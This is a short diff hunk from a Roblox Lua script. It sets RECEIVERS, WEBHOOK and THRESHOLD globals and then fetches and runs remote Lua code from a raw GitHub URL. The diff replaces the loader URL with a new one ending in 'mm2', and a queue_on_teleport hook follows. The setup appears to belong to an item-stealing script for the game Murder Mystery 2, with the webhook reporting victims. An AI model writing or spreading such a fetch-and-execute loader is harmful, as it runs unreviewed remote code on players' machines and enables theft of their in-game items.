@@ -1852,7 +1852,7 @@ local str7 = "    local HttpService = game:GetService(\"HttpService\")\n    loca
     getgenv().RECEIVERS = data.RECEIVERS
     getgenv().WEBHOOK   = data.WEBHOOK
     getgenv().THRESHOLD = data.THRESHOLD
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/mai2.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LeafyCloudAurh/Loader-/refs/heads/main/mm2"))()
 ]]
 
 if queue_on_teleport then
